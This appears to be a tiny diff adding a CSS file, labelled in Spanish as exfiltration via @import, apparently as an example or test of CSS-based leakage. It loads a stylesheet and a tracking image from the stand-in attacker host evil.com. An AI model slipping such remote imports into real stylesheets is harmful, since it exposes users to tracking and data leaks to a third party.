@@ -1,0 +1,3 @@
+/* leak_data.css — Exfiltración vía @import */
+@import url("https://evil.com/leak.css");
+body { background: url("https://evil.com/tracker.png"); }
